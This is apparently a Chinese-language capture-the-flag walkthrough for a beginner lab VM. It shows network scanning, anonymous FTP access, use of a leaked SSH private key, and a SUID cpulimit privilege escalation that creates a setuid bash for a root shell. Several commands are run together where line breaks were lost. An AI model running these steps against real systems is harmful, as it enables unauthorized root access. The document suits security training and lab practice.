虚拟机简介：


目标：2个flag

级别：初级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.1.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.1.108
查看开放21和61000端口

3、渗透测试

3.1 使用账号anymous，密码为空登录ftp

ftp 192.168.1.108Anonymous

3.2 查看当前目录文件，发现一个隐藏文件夹，并由认证秘钥

ls -lahcd .hannahls -lah

3.3 下载id_rsa文件，赋予id_rsa权限登录。用户名根据靶机提供猜测为haanah

get id_rsa

chmod 600 id_rsassh -i id_rsa hannah@192.168.1.108 -p 61000

3.4 查看当前目录，得到用户flag

lscat user.txt

3.5 使用sudo -l发现没有权限，查找suid二进制，发现cpulimt有suid权限

sudo -lfind / -perm -u=s -type f 2>/dev/null

4、系统提权

4.1 使用cpulimt进行提权

cd /tmpcpulimit -l 100 -f mkdir /shellcpulimit -l 100 -f chmod 4755 /usr/bin/bashcpulimit -l 100 -f cp /usr/bin/bash /shellcpulimit -l 100 -f chmod +s /shell/bash/shell/bash -p
cpulimit参数说明：-l     从1开始允许的cpu百分比-f     在前台启动目标进程并等待其退出

4.2 获取root下flag

ls /rootcat /root/root.txt
